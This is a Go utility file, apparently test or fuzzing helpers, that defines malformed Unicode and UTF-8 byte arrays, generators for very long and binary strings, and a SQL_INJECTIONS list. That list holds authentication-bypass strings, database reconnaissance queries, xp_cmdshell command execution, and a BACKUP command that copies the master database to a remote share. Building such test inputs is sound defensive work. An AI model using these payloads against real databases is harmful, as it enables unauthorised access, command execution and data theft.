package utils

import (
	"fmt"
	"strings"
)

var UNICODE_CHARACTERS = []byte{
	//Chinese
	0xe6, 0x97,
	0xa5, 0xe6,
	0x9c, 0xac,
	0xe8, 0xaa,
	0x9e, 0x06,
	//Arabic
	0x06, 0x27,
	0xf7, 0x9b,
	0x06, 0x2e,
	0x06, 0x30,
	0x06, 0x31,
	//Devangari
	0x09, 0x01,
	0x09, 0x35,
	0x09, 0x41,
	0x09, 0x10,
	0x09, 0x70,
	0x09, 0x65,
	//Bengali
	0x09, 0x88,
	0x09, 0xa5,
	0x09, 0xc4,
	0x09, 0xe2,
	0x09, 0xc2,
	0x09, 0xa8,
}

//fmt.Sprintf("%q", UNICODE_DATA)

var UTF8_BINARY = []byte{
	0xC0, 0x80,
	0x00, 0x00,
	0x56, 0x55,
	0x25, 0x74,
	0x5c, 0x26,
	0x13, 0x00,
	0x0c, 0x76,
	0x06, 0x03,
	0x77, 0x70,
	0x06, 0x72,
}

var SQL_INJECTIONS = []string{
	"select versionnumber, version_timestamp from sysibm.sysversions;",
	"select user from sysibm.sysdummy1;",
	"select session_user from sysibm.sysdummy1;",
	"select system_user from sysibm.sysdummy1;",
	"select current server from sysibm.sysdummy1;",
	"select name from sysibm.systables;",
	"select grantee from syscat.dbauth;",
	"select * from syscat.tabauth;",
	"select * from syscat.dbauth where grantee = current user;",
	"select * from syscat.tabauth where grantee = current user;",
	"select name, tbname, coltype from sysibm.syscolumns;",
	"SELECT schemaname FROM syscat.schemata;",
	"select @@version",
	"select @@servernamee",
	"select @@microsoftversione",
	"select * from master..sysserverse",
	"select * from sysusers",
	"exec master..xp_cmdshell 'ipconfig+/all'	",
	"exec master..xp_cmdshell 'net+view'",
	"exec master..xp_cmdshell 'net+users'",
	"exec master..xp_cmdshell 'ping+<attackerip>'",
	"BACKUP database master to disks='\\\\1.1.1.1\\1.1.1.1\\backupdb.dat'",
	"create table myfile (line varchar(8000))\" bulk insert foo from 'c:\\inetpub\\wwwroot\\auth.aspâ'\" select * from myfile\"--",
	"username>' OR 1=1--",
	"'OR '' = '	Allows authentication without a valid username.",
	"<username>'--",
	"' union select 1, 'username', 'password' 1--",
	"'OR 1=1--	",
}

func UnicodeString() string {
	return fmt.Sprintf("%q", UNICODE_CHARACTERS)
}

func Utf8String() string {
	return string(UTF8_BINARY)
}

func GiantString(length int) string {
	var b strings.Builder
	b.Grow(length)
	for i := 0; i < length; i++ {
		b.WriteByte(55)
	}
	return b.String()
}

func BinaryString(length int) string {
	var b strings.Builder
	b.Grow(length)
	for i := 0; i < length; i++ {
		b.WriteByte((byte)(i % 255))
	}
	return b.String()
}
